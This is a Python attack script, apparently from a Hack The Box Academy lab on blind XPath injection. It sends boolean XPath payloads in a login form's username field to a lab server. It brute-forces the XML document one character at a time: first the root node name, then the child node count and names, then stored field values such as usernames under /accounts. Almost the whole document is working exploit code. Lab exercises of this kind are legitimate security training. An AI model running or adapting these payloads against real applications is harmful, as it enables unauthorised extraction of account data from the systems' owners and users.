# XPath - Blind Exploitation
# https://academy.hackthebox.com/module/204/section/2226

import requests
import re
import string

base_url = 'http://94.237.56.175:35473/index.php'
msg_param = 'test'  # Assuming msg parameter remains constant
characters = string.ascii_letters + string.digits + string.punctuation
numbers = string.digits

# Finding the parent node name length and the name
parent_node_max_len = int(input("Please enter a max length for the parent node: "))
for parentNode_length in range(1, parent_node_max_len + 1):
    username_parentNode_payload = f"invalid' or string-length(name(/*[1]))={parentNode_length} and '1'='1"
    
    r = requests.post(base_url, data={'username': username_parentNode_payload, 'msg': msg_param})
    
    if re.findall(r'Message successfully sent!', r.text):
        print(f"Parent Node Length: {parentNode_length}")

        full_node_name = ""
        
        for node_position in range(1, 200):  # Adjust the upper limit as needed
            found_char = False
            
            for node_char in characters:
                username_node_payload = f"invalid' or substring(name(/*[1]),{node_position},1)='{node_char}' and '1'='1"
                
                r = requests.post(base_url, data={'username': username_node_payload, 'msg': msg_param})
                
                if re.findall(r'Message successfully sent!', r.text):
                    found_char = True
                    full_node_name += node_char
                    print(f"Node Character: {node_char}")
                    break  # Exit the character loop if a character is found
            
            if not found_char:
                break  # Exit the position loop if no character is found
            
        print(f"Full Node Name: {full_node_name}")
        # Add any additional logic here based on the full node name

# Finding the number of child nodes inside of the parent
child_node_max_len = int(input("Please enter a max possible number of child nodes: "))
for childNode_length in range(1, child_node_max_len + 1):
    username_childNode_payload = f"invalid' or count(/*[1]/*)={childNode_length} and '1'='1"
    
    r = requests.post(base_url, data={'username': username_childNode_payload, 'msg': msg_param})
    
    if re.findall(r'Message successfully sent!', r.text):
        print(f"Number of child nodes: {childNode_length}")
        ############# Safety ##############
        full_node_name = ""
        
        for node_position in range(1, 200):  # Adjust the upper limit as needed
            found_char = False
            
            for node_char in characters:
                username_node_payload = f"invalid' or substring(name(/accounts/*[1]),{node_position},1)='{node_char}' and '1'='1" # Enter full node name here.
                
                r = requests.post(base_url, data={'username': username_node_payload, 'msg': msg_param})
                
                if re.findall(r'Message successfully sent!', r.text):
                    found_char = True
                    full_node_name += node_char
                    print(f"Child Node Character: {node_char}")
                    break  # Exit the character loop if a character is found
            
            if not found_char:
                break  # Exit the position loop if no character is found
            
        print(f"Full Child Node Name: {full_node_name}")
        # Add any additional logic here based on the full node name

# Find the length of each varible and exfiltrating the value.
parent_node_max_len = int(input("Please enter a max length in NUMBERS for the parent node: "))
fieldname = input("What is the field name you wish to exfiltrate (choose 'username' if not sure): ")
for parentNode_length in range(1, parent_node_max_len + 1):
    username_parentNode_payload = f"invalid' or string-length(/accounts/acc[1]/{fieldname})={parentNode_length} and '1'='1" # 'username' here by default
    
    r = requests.post(base_url, data={'username': username_parentNode_payload, 'msg': msg_param})
    
    if re.findall(r'Message successfully sent!', r.text):
        print(f"Parent Node Length: {parentNode_length}")

        full_fieldname = ""
        
        for node_position in range(1, 200):  # Adjust the upper limit as needed
            found_char = False
            
            for node_char in characters:
                username_node_payload = f"invalid' or substring(/accounts/acc[1]/{fieldname},{node_position},1)='{node_char}' and '1'='1"
                
                r = requests.post(base_url, data={'username': username_node_payload, 'msg': msg_param})
                
                if re.findall(r'Message successfully sent!', r.text):
                    found_char = True
                    full_fieldname += node_char
                    print(f"Fieldname Character: {node_char}")
                    break  # Exit the character loop if a character is found
            
            if not found_char:
                break  # Exit the position loop if no character is found
            
        print(f"Full Fieldname: {full_fieldname}")
        # Add any additional logic here based on the full node name